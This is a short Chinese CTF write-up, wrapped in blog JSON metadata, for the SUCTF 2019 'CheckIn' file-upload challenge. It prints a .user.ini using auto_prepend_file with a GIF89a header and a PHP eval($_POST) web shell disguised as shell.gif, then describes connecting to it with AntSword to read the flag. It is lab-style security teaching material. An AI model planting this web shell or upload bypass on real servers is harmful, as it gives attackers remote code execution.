{"title":"SUCTF 2019-CheckIn","uid":"7028e45966f0fd8a9175e6d471456f27","slug":"SUCTF-2019-CheckIn","date":"2023-04-12T12:42:18.000Z","updated":"2023-04-12T12:51:19.358Z","comments":true,"path":"api/articles/SUCTF-2019-CheckIn.json","keywords":null,"cover":[],"content":"<p><img src=\"/images/SUCTF-2019-CheckIn/1.png\"></p>\n<p>文件上传，对文件类型，后缀名，文件内容都进行了过滤</p>\n<p>用.uer.ini绕过</p>\n<p>利用.user.ini指定文件，在当前目录下的文件执行时会将指定文件中的代码执行出来，以此实现带入后门</p>\n<p>准备一个.user.ini文件，内容如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GIF89a?\n\nauto_prepend_file &#x3D; shell.gif &#x2F;&#x2F;要上传的文件名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>要上传的文件的内容</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GIF89a?\n&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/images/SUCTF-2019-CheckIn/2.png\"></p>\n<p>进入文件上传的目录</p>\n<p><img src=\"/images/SUCTF-2019-CheckIn/3.png\"></p>\n<p>用蚁剑连接</p>\n<p><img src=\"/images/SUCTF-2019-CheckIn/4.png\"></p>\n<p>找到flag</p>\n<p><img src=\"/images/SUCTF-2019-CheckIn/5.png\"></p>\n","text":" 文件上传，对文件类型，后缀名，文件内容都进行了过滤 用.uer.ini绕过 利用.user.ini指定文件，在当前目录下的文件执行时会将指定文件中的代码执行出来，以此实现带入后门 准备一个.user.ini文件，内容如下 GIF89a? auto_prepend_file &#...","link":"","photos":[],"count_time":{"symbolsCount":315,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"后缀名绕过","slug":"后缀名绕过","count":1,"path":"api/tags/后缀名绕过.json"}],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SWPUCTF 2018-SimplePHP","uid":"fbcddf176f11d39ede5cfbba517000aa","slug":"SWPUCTF-2018-SimplePHP","date":"2023-06-25T09:04:43.000Z","updated":"2023-06-25T09:26:29.789Z","comments":true,"path":"api/articles/SWPUCTF-2018-SimplePHP.json","keywords":null,"cover":[],"text":" 题目要求上传一个文件 页面源码中可以得知flag在f1ag.php文件中 在查看文件页面，通过?file传入参数查看对应文件内容 file.php class.php &lt;?php class C1e4r &#123; public $test; public $str; ...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"HZNUCTF 2023 preliminary-ezlogin","uid":"f91bc0d4882aff535a39c946a3135f15","slug":"HZNUCTF-2023-preliminary-ezlogin","date":"2023-04-11T11:59:45.000Z","updated":"2023-04-11T12:50:06.880Z","comments":true,"path":"api/articles/HZNUCTF-2023-preliminary-ezlogin.json","keywords":null,"cover":null,"text":"1.png 查看网页源码，发现提示 2.png 对输入的username做判断，过滤掉select，union，and，database 并且对输入内容进行base64解码和字符串反转 页面根据输入内容没有明显回显和页面跳转，尝试盲注，延时注入 首先构造payload判断闭合符 ...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"SQL注入 盲注","slug":"SQL注入-盲注","count":1,"path":"api/tags/SQL注入-盲注.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}